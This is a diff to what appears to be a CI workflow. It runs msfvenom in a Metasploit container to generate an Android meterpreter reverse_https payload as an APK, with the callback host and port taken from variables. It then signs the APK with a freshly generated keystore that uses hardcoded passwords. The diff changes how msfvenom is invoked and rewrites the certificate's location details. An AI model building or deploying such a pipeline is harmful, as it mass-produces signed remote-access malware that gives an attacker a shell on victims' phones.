@@ -30,13 +30,12 @@ jobs:
         docker run --rm \
           -v $(pwd)/output:/output \
           metasploitframework/metasploit-framework:latest \
-          msfvenom -p android/meterpreter/reverse_https \
-          LHOST=$LHOST LPORT=$LPORT -o /output/sila_raw.apk
+          /bin/bash -c "/opt/metasploit-framework/bin/msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -o /output/sila_raw.apk"
 
     - name: Sign APK
       run: |
         if [ -f output/sila_raw.apk ]; then
-          keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
+          keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA,OU=Dev,O=Silatech,L=DSM,ST=Iowa,C=US"
           apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk
         else
           echo "APK generation failed!"
